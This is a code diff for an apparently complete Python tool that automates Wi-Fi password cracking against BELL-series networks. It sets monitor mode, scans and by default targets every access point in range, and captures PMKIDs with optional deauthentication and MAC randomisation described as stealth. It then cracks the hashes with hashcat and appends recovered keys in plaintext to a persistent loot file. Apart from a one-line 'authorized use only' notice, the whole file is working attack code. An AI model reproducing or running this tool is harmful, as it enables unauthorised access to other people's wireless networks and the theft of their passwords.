+    with log_path.open("w", encoding="utf-8") as fh:
+        fh.write("# " + " ".join(cmd) + "\n\n")
+        fh.flush()
+        try:
+            global RUNNING_PROC
+            proc = subprocess.Popen(
+                cmd,
+                stdin=subprocess.DEVNULL,
+                stdout=fh,
+                stderr=subprocess.STDOUT,
+                cwd=str(workdir),
+                text=True,
+                env={**os.environ, "XDG_DATA_HOME": str(workdir / "xdg")},
+                start_new_session=True,
+            )
+            RUNNING_PROC = proc
+            try:
+                proc.wait(timeout=budget_seconds)
+            except subprocess.TimeoutExpired:
+                proc.terminate()
+                try:
+                    proc.wait(timeout=20)
+                except subprocess.TimeoutExpired:
+                    proc.kill()
+                status = "interrupted"
+                detail = f"stopped at the budget ({human_time(budget_seconds)})"
+        except OSError as exc:
+            status = "error"
+            detail = str(exc)
+        finally:
+            RUNNING_PROC = None
+    elapsed = time.time() - started
+
+    if status == "error":
+        log(f"step '{step.name}' failed: {detail}", "error")
+    else:
+        log(f"step '{step.name}' finished in {human_time(elapsed)} ({status})")
+
+    cracked = show_cracked(step.hashes, potfile) if step.hashes else []
+    if cracked:
+        status = "done"
+        detail = f"{len(cracked)} key(s) recovered"
+    return StepResult(step.name, status, detail, cracked, elapsed, log_path)
+
+
+# --------------------------------------------------------------------------
+# capture: monitor mode, PMKID collection
+# --------------------------------------------------------------------------
+
+
+@dataclass
+class MonitorSession:
+    interface: str
+    strategy: str
+    original_kind: str = "managed"
+    created: bool = False
+
+    def cleanup(self, log: Log) -> None:
+        if self.strategy == "physical" and self.created:
+            run(["ip", "link", "set", self.interface, "down"], timeout=15)
+            run(["iw", "dev", self.interface, "set", "type", "managed"], timeout=20)
+            run(["ip", "link", "set", self.interface, "up"], timeout=15)
+            if shutil.which("nmcli"):
+                run(["nmcli", "device", "set", self.interface, "managed", "yes"], timeout=15)
+                run(["nmcli", "device", "connect", self.interface], timeout=20)
+            log(f"monitor: restored {self.interface} to managed mode")
+        elif self.strategy == "airmon" and self.created:
+            run(["airmon-ng", "stop", self.interface], timeout=30)
+            if shutil.which("nmcli"):
+                run(["nmcli", "device", "set", self.interface, "managed", "yes"], timeout=15)
+            log(f"monitor: stopped {self.interface}")
+
+
+def _monitor_mode_active(iface: str) -> bool:
+    """Return True when `iw dev <iface> info` reports type monitor."""
+    proc = run(["iw", "dev", iface, "info"], timeout=15)
+    if proc.returncode != 0:
+        return False
+    return re.search(r"type\s+monitor\b", proc.stdout) is not None
+
+
+def prepare_monitor(
+    iface: str, strategy: str, log: Log
+) -> MonitorSession:
+    """Put the adapter into monitor mode.
+
+    "physical" uses `iw dev X set monitor otherbss` so no virtual monitor
+    interface is created. hcxdumptool's own guidance is to avoid virtual
+    interfaces and to set monitor mode itself, so this is the closest match
+    for a wifite-driven run.
+    """
+    session = MonitorSession(interface=iface, strategy=strategy)
+
+    # capture needs root; fail early with a clear message instead of an
+    # opaque "Operation not permitted"
+    if os.geteuid() != 0:
+        raise RuntimeError(
+            f"monitor mode requires root: re-run with sudo "
+            f"(e.g. `sudo {sys.argv[0]}`)"
+        )
+
+    info = run(["iw", "dev", iface, "info"], timeout=15)
+    m = re.search(r"type\s+(\S+)", info.stdout)
+    session.original_kind = m.group(1) if m else "managed"
+
+    if strategy == "managed":
+        log(f"monitor: using {iface} as-is ({session.original_kind})", "warn")
+        return session
+
+    if strategy == "physical":
+        # Take only THIS interface out of NetworkManager's control so the
+        # rest of the system (e.g. the wired uplink) keeps its connectivity.
+        # Never stop NetworkManager as a whole.
+        if shutil.which("nmcli"):
+            run(["nmcli", "device", "disconnect", iface], timeout=15)
+            run(["nmcli", "device", "set", iface, "managed", "no"], timeout=15)
+        # Do NOT run `airmon-ng check kill`: it kills NetworkManager and
+        # wpa_supplicant system-wide and would drop the user's internet.
+        # Only this interface is taken out of NM's control above.
+        # the adapter is often busy in managed mode; bring it down first so
+        # the monitor-mode switch succeeds on the first try
+        run(["ip", "link", "set", iface, "down"], timeout=15)
+
+        drv = adapter_driver(iface)
+        is_rt2800usb = "rt2800usb" in (drv or "").lower()
+
+        last_err = ""
+        for attempt in range(7):
+            if is_rt2800usb:
+                # rt2800usb: "otherbss" flag is unsupported (Invalid argument).
+                # EBUSY occurs if type monitor is set without the interface up
+                # or without a channel set first.  Use the sequence:
+                #   ip link set up, then iw dev set type monitor.
+                proc = run(
+                    ["iw", "dev", iface, "set", "type", "monitor"], timeout=20
+                )
+                if proc.returncode == 0:
+                    run(["ip", "link", "set", iface, "up"], timeout=15)
+                    session.created = True
+                    log(
+                        f"monitor: {iface} switched to monitor mode "
+                        f"(physical, rt2800usb, no virtual iface)",
+                        "info",
+                    )
+                    return session
+                last_err = proc.stderr.strip() or proc.stdout.strip()
+                # interface may still be busy; bring it up, then retry
+                run(["ip", "link", "set", iface, "up"], timeout=15)
+            else:
+                # original approach for other drivers: otherbss avoids virtual iface
+                proc = run(
+                    ["iw", "dev", iface, "set", "monitor", "otherbss"], timeout=20
+                )
+                if proc.returncode == 0:
+                    run(["ip", "link", "set", iface, "up"], timeout=15)
+                    session.created = True
+                    log(
+                        f"monitor: {iface} switched to monitor mode "
+                        f"(physical, no virtual iface)",
+                        "info",
+                    )
+                    return session
+                last_err = proc.stderr.strip() or proc.stdout.strip()
+
+            # interface may still be busy; retry after a short delay
+            time.sleep(1 if not is_rt2800usb else 2)
+            run(["ip", "link", "set", iface, "down"], timeout=15)
+
+        run(["ip", "link", "set", iface, "up"], timeout=15)
+        # restore NM management so the user is not left disconnected
+        if shutil.which("nmcli"):
+            run(["nmcli", "device", "set", iface, "managed", "yes"], timeout=15)
+        raise RuntimeError(
+            f"could not set {iface} to monitor mode: {last_err}"
+        )
+
+    if strategy == "airmon":
+        proc = run(["airmon-ng", "start", iface], timeout=60)
+        blob = proc.stdout + proc.stderr
+        # airmon-ng prints "(monitor mode enabled on wlp1s0mon)"
+        found = re.search(r"\(monitor mode enabled on ([^\s\)]+)\)", blob)
+        if found:
+            session.interface = found.group(1)
+            session.created = True
+            log(f"monitor: airmon-ng created {session.interface}")
+        else:
+            log("monitor: airmon-ng did not report a monitor interface", "warn")
+        return session
+
+    raise ValueError(f"unknown monitor strategy {strategy!r}")
+
+
+def build_bpf_filter(targets: Sequence[Target], out_path: Path, log: Log) -> Optional[Path]:
+    """Build a tcpdump BPF program matching the target APs.
+
+    hcxdumptool requires a BPF program when a filter list is used, and the
+    official recommendation is to always scope capture with BPF.
+    """
+    macs = [t.bssid for t in targets if t.bssid]
+    if not macs:
+        return None
+    expr = " or ".join(f"wlan addr3 {mac}" for mac in macs)
+    proc = run(
+        ["tcpdump", "-s", "1024", "-y", "IEEE802_11_RADIO", expr, "-dd"],
+        timeout=30,
+    )
+    if proc.returncode != 0 or not proc.stdout.strip():
+        log(f"bpf: tcpdump failed: {proc.stderr.strip()[:160]}", "warn")
+        return None
+    out_path.parent.mkdir(parents=True, exist_ok=True)
+    out_path.write_text(proc.stdout.strip() + "\n", encoding="utf-8")
+    log(f"bpf: wrote filter for {len(macs)} AP(s) -> {out_path}")
+    return out_path
+
+
+def randomize_mac(iface: str, log: Log) -> bool:
+    """Apply macchanger -A (random MAC).
+
+    Note: hcxdumptool manages its own random MAC address space, so this only
+    affects the interface state seen by other tooling (e.g. the deauth path).
+    """
+    if not have("macchanger"):
+        log("stealth: macchanger is not installed, skipping MAC randomization",
+            "warn")
+        return False
+    proc = run(["macchanger", "-A", iface], timeout=30)
+    if proc.returncode != 0:
+        log(f"stealth: macchanger failed: {proc.stderr.strip()[:120]}", "warn")
+        return False
+    log(f"stealth: random MAC applied to {iface}")
+    return True
+
+
+def capture_pmkids(
+    targets: Sequence[Target],
+    cfg: Config,
+    workdir: Path,
+    log: Log,
+) -> Tuple[Optional[Path], List[Path]]:
+    """Collect PMKIDs for the selected targets.
+
+    Returns (pcapng_or_None, list_of_22000_files).
+    """
+    if not targets:
+        raise RuntimeError("no targets selected for capture")
+
+    backend = str(cfg.get("capture_backend") or "wifite")
+    captures = workdir / "captures"
+    hs_dir = workdir / "hs"
+    captures.mkdir(parents=True, exist_ok=True)
+    hs_dir.mkdir(parents=True, exist_ok=True)
+
+    produced: List[Path] = []
+    pcapng: Optional[Path] = None
+
+    if backend == "hcxdumptool":
+        stamp = time.strftime("%Y%m%d-%H%M%S")
+        pcapng = captures / f"bell_{stamp}.pcapng"
+        cmd = [
+            "hcxdumptool",
+            "-i",
+            cfg.get("interface") or "",
+            "-w",
+            str(pcapng),
+            "--rds=1",
+        ]
+        # hcxdumptool sets monitor mode itself and advises against third
+        # party tools doing it, so the interface is handed over as is.
+        channels = {t.channel for t in targets if t.channel}
+        if len(channels) == 1:
+            cmd += ["-c", str(channels.pop())]
+        else:
+            cmd.append("-F")
+        if cfg.get("build_bpf"):
+            bpf = build_bpf_filter(targets, captures / f"filter_{stamp}.bpf", log)
+            if bpf:
+                cmd += ["--bpf", str(bpf)]
+                # --essidlist scopes capture to the selected SSIDs (the old
+                # --filterlist_ap flag no longer exists in hcxdumptool 6.3.5).
+                essids = captures / f"essids_{stamp}.txt"
+                essids.write_text(
+                    "\n".join(sorted({t.essid for t in targets})) + "\n",
+                    encoding="utf-8",
+                )
+                cmd += ["--essidlist", str(essids)]
+        timeout = int(cfg.get("pmkid_timeout") or 120)
+        log(f"capture: hcxdumptool for {timeout}s")
+        run(cmd, timeout=timeout + 30)
+        if pcapng.exists() and pcapng.stat().st_size:
+            log(f"capture: wrote {pcapng}")
+        else:
+            pcapng = None
+            log("capture: hcxdumptool produced no capture", "warn")
+    else:
+        timeout = int(cfg.get("pmkid_timeout") or 120)
+        cmd = [
+            "wifite",
+            "-i",
+            cfg.get("interface") or "",
+            "--pmkid",
+            "--pmkid-timeout",
+            str(timeout),
+            "--skip-crack",
+            "--kill",
+            "-v",
+        ]
+        channels = {t.channel for t in targets if t.channel}
+        if len(channels) == 1:
+            cmd += ["-c", str(channels.pop())]
+        if cfg.get("randomize_mac"):
+            cmd.append("--mac")
+        if cfg.get("allow_deauth"):
+            cmd += ["--num-deauths", str(int(cfg.get("deauth_count") or 1))]
+        log(f"capture: wifite --pmkid for {timeout}s per target")
+        for target in targets:
+            one = cmd + ["-b", target.bssid]
+            log(f"capture: {target.essid} ({target.bssid})")
+            run(one, timeout=timeout + 120, cwd=workdir)
+        produced = sorted(hs_dir.glob("*.22000"))
+        if produced:
+            log(f"capture: wifite wrote {len(produced)} hash file(s)")
+        else:
+            log("capture: wifite produced no .22000 files", "warn")
+    return pcapng, produced
+
+
+def convert_and_filter(
+    cfg: Config,
+    workdir: Path,
+    log: Log,
+    pcapng: Optional[Path],
+    captured: Sequence[Path],
+    targets: Sequence[Target],
+) -> Tuple[Optional[Path], List[HashEntry]]:
+    """Convert captures to hc22000 and filter them to the BELL targets."""
+    all_hashes = workdir / "all.22000"
+    bell_hashes = workdir / "bell.22000"
+    essid_list = workdir / "essids.txt"
+
+    if pcapng and pcapng.exists():
+        cmd = ["hcxpcapngtool", "-o", str(all_hashes), "-E", str(essid_list),
+               str(pcapng)]
+        log(f"convert: {' '.join(shlex.quote(c) for c in cmd)}")
+        proc = run(cmd, timeout=180)
+        if proc.returncode != 0:
+            log(f"convert: hcxpcapngtool failed: {proc.stderr.strip()[:160]}",
+                "error")
+    elif captured:
+        merged = all_hashes
+        with merged.open("w", encoding="utf-8") as fh:
+            for path in captured:
+                fh.write(path.read_text(encoding="utf-8", errors="replace"))
+        log(f"convert: merged {len(captured)} wifite hash file(s)")
+    else:
+        log("convert: nothing to convert", "warn")
+        return None, []
+
+    if not all_hashes.exists():
+        return None, []
+
+    regex = scope_regex(cfg)
+    cmd = ["hcxhashtool", "-i", str(all_hashes), "-o", str(bell_hashes),
+           f"--essid-regex={regex}"]
+    log(f"filter: {' '.join(shlex.quote(c) for c in cmd)}")
+    proc = run(cmd, timeout=120)
+    if proc.returncode != 0 or not bell_hashes.exists():
+        log("filter: hcxhashtool failed, filtering locally", "warn")
+        entries = [
+            e
+            for e in load_22000(all_hashes)
+            if re.search(regex, e.essid, re.IGNORECASE)
+        ]
+        write_22000(bell_hashes, entries)
+    else:
+        entries = load_22000(bell_hashes)
+
+    if targets:
+        wanted = {t.bssid for t in targets if t.bssid}
+        if wanted:
+            scoped = [e for e in entries if e.bssid in wanted]
+            if scoped:
+                entries = scoped
+    log(f"filter: {len(entries)} hash(es) for {len({e.essid for e in entries})} ESSID(s)")
+    return bell_hashes, entries
+
+
+# --------------------------------------------------------------------------
+# report
+# --------------------------------------------------------------------------
+
+
+def write_report(
+    workdir: Path,
+    entries: Sequence[HashEntry],
+    results: Sequence[StepResult],
+    plan: Sequence[Step],
+    log: Log,
+) -> Dict[str, Any]:
+    cracked: List[Cracked] = []
+    for result in results:
+        cracked.extend(result.cracked)
+
+    def find_key(entry: HashEntry) -> str:
+        for item in cracked:
+            if item.essid and item.essid == entry.essid:
+                if not item.bssid or not entry.bssid or item.bssid == entry.bssid:
+                    return item.password
+        for item in cracked:
+            if item.bssid and item.bssid == entry.bssid:
+                return item.password
+        return ""
+
+    rows = []
+    for entry in entries:
+        key = find_key(entry)
+        rows.append(
+            {
+                "essid": entry.essid,
+                "bssid": entry.bssid,
+                "sta": entry.sta,
+                "type": entry.mtype,
+                "cracked": bool(key),
+                "key": key,
+            }
+        )
+
+    payload = {
+        "tool": APP,
+        "version": VERSION,
+        "generated": time.strftime("%Y-%m-%dT%H:%M:%S"),
+        "hashes": len(entries),
+        "essids": sorted({e.essid for e in entries}),
+        "cracked_count": sum(1 for r in rows if r["cracked"]),
+        "results": rows,
+        "steps": [s.to_dict() for s in plan],
+    }
+    results_dir = workdir / "results"
+    results_dir.mkdir(parents=True, exist_ok=True)
+    write_json(results_dir / "summary.json", payload)
+
+    lines = [
+        f"{APP} {VERSION} - results",
+        f"generated : {payload['generated']}",
+        f"hashes    : {payload['hashes']}",
+        f"essids    : {', '.join(payload['essids']) or '-'}",
+        f"cracked   : {payload['cracked_count']}",
+        "",
+    ]
+    for row in rows:
+        if row["cracked"]:
+            lines.append(f"  [OK]   {row['essid']}  {row['bssid']}  {row['key']}")
+        else:
+            lines.append(f"  [--]   {row['essid']}  {row['bssid']}")
+    lines.append("")
+    for result in results:
+        lines.append(
+            f"  {result.status:>9}  {result.name}  {human_time(result.elapsed)}"
+            + (f"  ({result.detail})" if result.detail else "")
+        )
+    (results_dir / "summary.txt").write_text("\n".join(lines) + "\n",
+                                              encoding="utf-8")
+    log(f"report: wrote {results_dir / 'summary.txt'}")
+
+    # Restrict permissions on sensitive report artifacts.
+    potfile_path = workdir / "results" / "hashcat.pot"
+    for sensitive in (results_dir / "summary.json",
+                      results_dir / "summary.txt",
+                      potfile_path):
+        if sensitive.exists():
+            try:
+                os.chmod(sensitive, 0o600)
+            except OSError:
+                pass
+
+    # Persistent loot file: cracked passwords in plaintext, append-only, never
+    # cleaned up. Survives across runs so a lab never loses a recovered key.
+    loot_path = workdir / "loot.txt"
+    try:
+        with loot_path.open("a", encoding="utf-8") as fh:
+            for row in rows:
+                if row["cracked"]:
+                    fh.write(
+                        f"{time.strftime('%Y-%m-%dT%H:%M:%S')}  "
+                        f"ESSID={row['essid']}  BSSID={row['bssid']}  "
+                        f"KEY={row['key']}\n"
+                    )
+            fh.flush()
+            os.fsync(fh.fileno())
+        try:
+            os.chmod(loot_path, 0o600)
+        except OSError:
+            pass
+        chown_to_real_user(loot_path)
+        log(f"report: appended cracked keys to {loot_path}")
+    except OSError as exc:
+        log(f"report: could not write loot file: {exc}", "warn")
+    return payload
+
+
+# --------------------------------------------------------------------------
+# workflow orchestration
+# --------------------------------------------------------------------------
+
+
+@dataclass
+class RunState:
+    config: Config
+    workdir: Path
+    log: Log
+    phase: str = "idle"
+    phase_index: int = 0
+    phase_total: int = 0
+    message: str = ""
+    targets: List[Target] = field(default_factory=list)
+    entries: List[HashEntry] = field(default_factory=list)
+    plan: List[Step] = field(default_factory=list)
+    results: List[StepResult] = field(default_factory=list)
+    step_state: Dict[str, str] = field(default_factory=dict)
+    step_detail: Dict[str, str] = field(default_factory=dict)
+    done: bool = False
+    error: str = ""
+    stop_requested: bool = False
+    payload: Dict[str, Any] = field(default_factory=dict)
+    current_log: List[str] = field(default_factory=list)
+    preflight: Dict[str, Any] = field(default_factory=dict)
+
+
+class Workflow:
+    """Sequential phase runner shared by the TUI and the CLI."""
+
+    def __init__(self, state: RunState) -> None:
+        self.state = state
+        self.cfg = state.config
+        self.workdir = state.workdir
+        self.log = state.log
+        self.potfile = self.workdir / "results" / "hashcat.pot"
+        self.potfile.parent.mkdir(parents=True, exist_ok=True)
+        self._pcapng: Optional[Path] = None
+        self._monitor: Optional[MonitorSession] = None
+
+    # -- helpers ---------------------------------------------------------
+    def _phase(self, name: str, total: int, index: int, message: str) -> None:
+        self.state.phase = name
+        self.state.phase_total = total
+        self.state.phase_index = index
+        self.state.message = message
+        self.log(f"phase {index}/{total}: {name} - {message}")
+
+    def _stopped(self) -> bool:
+        return self.state.stop_requested
+
+    # -- phases ----------------------------------------------------------
+    def preflight(self) -> Dict[str, Any]:
+        info: Dict[str, Any] = {
+            "root": os.geteuid() == 0,
+            "tools": {},
+            "missing": [],
+            "interfaces": [],
+            "hashcat_devices": "",
+        }
+        for tool in TOOLS_REQUIRED:
+            path = which(tool)
+            info["tools"][tool] = path or ""
+            if not path:
+                info["missing"].append(tool)
+        for tool in TOOLS_OPTIONAL:
+            info["tools"][tool] = which(tool) or ""
+
+        info["interfaces"] = [i.to_dict() for i in list_interfaces()]
+        iface = self.cfg.get("interface")
+        if iface:
+            match = [i for i in list_interfaces() if i.name == iface]
+            info["monitor_capable"] = bool(match) and monitor_capable(match[0])
+            drv = adapter_driver(str(iface))
+            info["adapter_driver"] = drv
+            if drv and drv not in USB_WIFI_DRIVERS:
+                info.setdefault("warnings", []).append(
+                    f"adapter {iface} uses driver '{drv}', which is not in the "
+                    f"known USB-WiFi set (Ralink/TP-Link); monitor mode may fail"
+                )
+        else:
+            info["monitor_capable"] = False
+            info["adapter_driver"] = ""
+
+        if have("hashcat"):
+            proc = run(["hashcat", "-I"], timeout=60)
+            lines = (proc.stdout + proc.stderr).splitlines()
+            devices = []
+            for i, line in enumerate(lines):
+                if "Device #" in line and ":" in line:
+                    devices.append(line.strip())
+                elif line.strip().startswith("Name...."):
+                    devices.append(line.strip())
+            info["hashcat_devices"] = "; ".join(devices[:6])
+
+        self.state.preflight = info
+        if info["missing"]:
+            self.log(f"preflight: missing tools {info['missing']}", "warn")
+        if not info["root"]:
+            self.log("preflight: not running as root - capture needs root", "warn")
+        return info
+
+    def _ensure_monitor(self) -> None:
+        """Put the adapter into monitor mode once, for the whole run."""
+        if self._monitor is not None:
+            return
+        if str(self.cfg.get("capture_backend") or "wifite") == "hcxdumptool":
+            # hcxdumptool sets monitor mode itself
+            return
+        # Never stop NetworkManager globally: that would kill the user's
+        # (possibly wired) internet connection. Per-interface disconnect
+        # happens inside prepare_monitor instead.
+        try:
+            self._monitor = prepare_monitor(
+                str(self.cfg.get("interface")),
+                str(self.cfg.get("monitor_mode") or "physical"),
+                self.log,
+            )
+        except Exception as exc:  # noqa: BLE001 - surface in TUI
+            self.log(f"monitor: failed to set monitor mode: {exc}", "error")
+            self._monitor = None
+            raise
+
+    def do_scan(self) -> List[Target]:
+        iface = self.cfg.get("interface")
+        if not iface:
+            raise RuntimeError("no interface selected")
+        self._ensure_monitor()
+        seconds = int(self.cfg.get("scan_seconds") or DEFAULTS["scan_seconds"])
+        targets = scan(iface, seconds, self.workdir / "captures", self.log)
+        self.state.targets = filter_targets(targets, scope_regex(self.cfg))
+        # preferred networks (BELL7 by default) come first; everything in
+        # range is in scope, so all are selected by default (no BSSID typing)
+        self.state.targets.sort(
+            key=lambda t: (not is_preferred(t.essid, self.cfg), t.essid)
+        )
+        for t in self.state.targets:
+            t.selected = True
+        return self.state.targets
+
+    def do_capture(self) -> None:
+        targets = [t for t in self.state.targets if t.selected]
+        if not targets:
+            raise RuntimeError("no targets selected for capture")
+        backend = str(self.cfg.get("capture_backend") or "wifite")
+        session: Optional[MonitorSession] = None
+        if backend == "hcxdumptool":
+            # hcxdumptool sets monitor mode itself; the official guidance is
+            # not to let a third party tool do it.
+            log("monitor: hcxdumptool sets monitor mode itself")
+        else:
+            self._ensure_monitor()
+            session = self._monitor
+        try:
+            if self.cfg.get("randomize_mac"):
+                randomize_mac(session.interface if session else
+                              str(self.cfg.get("interface") or ""), self.log)
+            pcapng, captured = capture_pmkids(
+                targets, self.cfg, self.workdir, self.log
+            )
+            self._pcapng = pcapng
+        finally:
+            if session and session is not self._monitor:
+                session.cleanup(self.log)
+
+    def do_convert_filter(self) -> None:
+        bell, entries = convert_and_filter(
+            self.cfg,
+            self.workdir,
+            self.log,
+            self._pcapng,
+            sorted((self.workdir / "hs").glob("*.22000")),
+            [t for t in self.state.targets if t.selected],
+        )
+        self.state.entries = entries
+        if bell:
+            self.cfg.set("_bell_hashes", str(bell))
+
+    def do_plan(self) -> List[Step]:
+        bell = Path(self.cfg.get("_bell_hashes") or self.workdir / "bell.22000")
+        if not self.state.entries and bell.exists():
+            self.state.entries = load_22000(bell)
+            self.log(f"plan: loaded {len(self.state.entries)} hash(es) from {bell}")
+        speed = detect_speed(self.cfg, self.workdir, self.log)
+        plan = build_plan(self.state.entries, self.cfg, bell, speed,
+                          self.workdir / "masks")
+
+        # Candidate wordlists run after the mask chain, as requested.
+        candidates = build_candidate_wordlists(
+            self.state.entries, self.cfg, self.workdir, self._pcapng, self.log
+        )
+        labels = {
+            "derived": "SSID-derived candidates",
+            "rules": "rule-expanded candidates",
+            "hcxeiutool": "hcxeiutool ESSID patterns",
+            "hcxpsktool": "hcxpsktool weak-PSK candidates",
+            "wordlist": "configured wordlist",
+        }
+        for key, label in labels.items():
+            path = candidates.get(key)
+            if not path:
+                continue
+            try:
+                count = count_lines(path)
+            except OSError:
+                count = 0
+            if not count:
+                continue
+            step = Step(
+                name=f"wordlist:{key}",
+                kind="wordlist",
+                desc=f"{label}: {count} candidates from {path.name}",
+                group="candidates",
+                keyspace=count,
+                wordlist=path,
+                hashes=bell,
+            )
+            if speed and speed > 0:
+                step.est_seconds = count / speed
+            plan.append(step)
+
+        self.state.plan = plan
+        for step in self.state.plan:
+            self.state.step_state.setdefault(step.name, "pending")
+        return self.state.plan
+
+    def do_attack(self) -> None:
+        if not self.state.plan:
+            self.do_plan()
+        force = hashcat_needs_force(self.log)
+        budget_raw = self.cfg.get("max_hours_per_step")
+        budget = (float(budget_raw) * 3600.0) if budget_raw else 0.0
+        for step in self.state.plan:
+            if self._stopped():
+                break
+            if (
+                budget > 0
+                and step.est_seconds
+                and step.est_seconds > budget
+                and not self.cfg.get("allow_huge_keyspace")
+            ):
+                step.skip_reason = (
+                    f"ETA {human_time(step.est_seconds)} exceeds the "
+                    f"{human_time(budget)} budget (raise --max-hours or enable "
+                    f"huge keyspaces)"
+                )
+            self.state.step_state[step.name] = "running"
+            self.state.step_detail[step.name] = step.desc
+            result = run_step(step, self.cfg, self.workdir, self.log, self.potfile,
+                              force)
+            self.state.results.append(result)
+            self.state.step_state[step.name] = result.status
+            self.state.step_detail[step.name] = result.detail or step.desc
+            if result.log_path:
+                self.state.current_log = result.log_path.read_text(
+                    encoding="utf-8", errors="replace"
+                ).splitlines()[-40:]
+        if self.state.results:
+            cracked = show_cracked(
+                Path(self.cfg.get("_bell_hashes") or self.workdir / "bell.22000"),
+                self.potfile,
+            )
+            for result in self.state.results:
+                result.cracked = list(cracked)
+
+    def do_report(self) -> Dict[str, Any]:
+        bell = Path(self.cfg.get("_bell_hashes") or self.workdir / "bell.22000")
+        self.state.payload = write_report(
+            self.workdir, self.state.entries, self.state.results,
+            self.state.plan, self.log,
+        )
+        return self.state.payload
+
+    def run(self, phases: Sequence[str]) -> Dict[str, Any]:
+        total = len(phases)
+        try:
+            for index, phase in enumerate(phases, start=1):
+                if self._stopped():
+                    break
+                try:
+                    if phase == "preflight":
+                        self._phase("preflight", total, index, "checking toolchain")
+                        self.preflight()
+                    elif phase == "scan":
+                        self._phase("scan", total, index, "enumerating access points")
+                        self.do_scan()
+                    elif phase == "capture":
+                        self._phase("capture", total, index, "collecting PMKIDs")
+                        self.do_capture()
+                    elif phase == "convert":
+                        self._phase("convert", total, index, "converting to hc22000")
+                    elif phase == "filter":
+                        self._phase("filter", total, index, "filtering to the scope")
+                        self.do_convert_filter()
+                    elif phase == "plan":
+                        self._phase("plan", total, index, "building the attack chain")
+                        self.do_plan()
+                    elif phase == "attack":
+                        self._phase("attack", total, index, "running the chain")
+                        self.do_attack()
+                    elif phase == "report":
+                        self._phase("report", total, index, "writing the report")
+                        self.do_report()
+                except Exception as exc:  # surfaced in the TUI and the CLI
+                    # one phase failing must not skip the phases after it,
+                    # the report in particular
+                    self.state.error = f"{phase}: {type(exc).__name__}: {exc}"
+                    self.log(f"error in phase {phase}: {exc}", "error")
+        finally:
+            if self._monitor:
+                self._monitor.cleanup(self.log)
+                self._monitor = None
+            self.state.done = True
+        return self.state.payload
+
+
+# --------------------------------------------------------------------------
+# curses TUI
+# --------------------------------------------------------------------------
+
+
+class TUI:
+    """Interactive front end: interface picker, stealth prompts, guided run."""
+
+    def __init__(self, state: RunState) -> None:
+        self.state = state
+        self.cfg = state.config
+        self.screen = "intro"
+        self.status = ""
+        self.interfaces: List[WirelessIface] = []
+        self.idx = 0
+        self.thread: Optional[threading.Thread] = None
+        self.workflow: Optional[Workflow] = None
+        self.results_payload: Dict[str, Any] = {}
+
+    # -- drawing helpers -------------------------------------------------
+    def _put(self, stdscr, y: int, x: int, text: str, attr: int = 0) -> None:
+        h, w = stdscr.getmaxyx()
+        if y < 0 or y >= h or x < 0 or x >= w:
+            return
+        try:
+            stdscr.addnstr(y, x, text, max(0, w - x - 1), attr)
+        except curses.error:
+            pass
+
+    def _header(self, stdscr, title: str) -> int:
+        h, w = stdscr.getmaxyx()
+        try:
+            stdscr.attron(curses.color_pair(5) | curses.A_BOLD)
+            stdscr.addnstr(0, 0, f" {APP} {VERSION}  {title}".ljust(w - 1), w - 1)
+            stdscr.attroff(curses.color_pair(5) | curses.A_BOLD)
+        except curses.error:
+            pass
+        return 2
+
+    def _footer(self, stdscr, keys: str) -> None:
+        h, w = stdscr.getmaxyx()
+        if h < 2:
+            return
+        try:
+            stdscr.attron(curses.color_pair(5))
+            stdscr.addnstr(h - 1, 0, " " + keys.ljust(w - 2)[: max(0, w - 2)],
+                           max(0, w - 1))
+            stdscr.attroff(curses.color_pair(5))
+        except curses.error:
+            pass
+
+    def _init_colors(self) -> None:
+        if not curses.has_colors():
+            return
+        curses.start_color()
+        try:
+            curses.use_default_colors()
+        except curses.error:
+            pass
+        curses.init_pair(1, curses.COLOR_CYAN, -1)
+        curses.init_pair(2, curses.COLOR_YELLOW, -1)
+        curses.init_pair(3, curses.COLOR_GREEN, -1)
+        curses.init_pair(4, curses.COLOR_RED, -1)
+        curses.init_pair(5, curses.COLOR_WHITE, curses.COLOR_BLUE)
+        curses.init_pair(6, curses.COLOR_MAGENTA, -1)
+
+    # -- entry point -----------------------------------------------------
+    def run(self, force_plain: bool = False) -> int:
+        if force_plain:
+            return self._plain()
+        # ensure a usable terminal type for curses
+        if not os.environ.get("TERM") or os.environ.get("TERM") == "dumb":
+            os.environ["TERM"] = "xterm"
+        if curses is None:
+            sys.stderr.write("curses is not available; using plain mode\n")
+            return self._plain()
+        if not sys.stdout.isatty():
+            return self._plain()
+        # keep log output out of the terminal while curses owns the screen
+        try:
+            self.state.log.quiet = True
+        except Exception:
+            pass
+        try:
+            curses.wrapper(self._main)
+        except curses.error as exc:
+            sys.stderr.write(f"curses unavailable ({exc}); using plain mode\n")
+            return self._plain()
+        return 0
+
+    def _main(self, stdscr) -> None:
+        self._init_colors()
+        curses.noecho()
+        curses.cbreak()
+        stdscr.keypad(True)
+        stdscr.timeout(-1)
+        try:
+            curses.curs_set(0)
+        except curses.error:
+            pass
+        # the intro screen shows the toolchain, so check it before drawing
+        self.state.preflight = Workflow(self.state).preflight()
+        while self.screen not in ("quit",):
+            if self.screen == "intro":
+                self.screen = self._screen_intro(stdscr)
+            elif self.screen == "interfaces":
+                self.screen = self._screen_interfaces(stdscr)
+            elif self.screen == "config":
+                self.screen = self._screen_config(stdscr)
+            elif self.screen == "targets":
+                self.screen = self._screen_targets(stdscr)
+            elif self.screen == "run":
+                self.screen = self._screen_run(stdscr)
+            elif self.screen == "results":
+                self.screen = self._screen_results(stdscr)
+
+    # -- screen: intro ---------------------------------------------------
+    def _screen_intro(self, stdscr) -> str:
+        while True:
+            stdscr.erase()
+            row = self._header(stdscr, "WiFi PMKID red-team workflow")
+            info = self.state.preflight or {}
+            tools = info.get("tools", {})
+            missing = info.get("missing", [])
+            lines = [
+                "",
+                "  Target      : BELL-series SSIDs matching "
+                f"{self.cfg.get('essid_regex')}",
+                "  Adapter     : "
+                f"{self.cfg.get('interface') or '(none)'}  "
+                f"driver={self.state.preflight.get('adapter_driver') or '?'}",
+                "  Method      : PMKID capture (wifite / hcxdumptool) -> "
+                "hcxpcapngtool -> hcxhashtool",
+                "  Cracking    : hashcat -m 22000, alphanumeric mask chain "
+                f"({self.cfg.get('mask_len')} chars, "
+                f"{self.cfg.get('mask_charset')})",
+                "",
+                "  Toolchain:",
+            ]
+            for tool in TOOLS_REQUIRED:
+                mark = "ok " if tools.get(tool) else "MISSING"
+                lines.append(f"    [{mark}] {tool}")
+            lines += [
+                "",
+                "  Authorized use only: a controlled lab environment where "
+                "every",
+                "  signal in range is in scope.",
+                "",
+            ]
+            if missing:
+                lines.append(f"  WARNING: missing {', '.join(missing)}")
+                lines.append("")
+            for i, line in enumerate(lines):
+                attr = 0
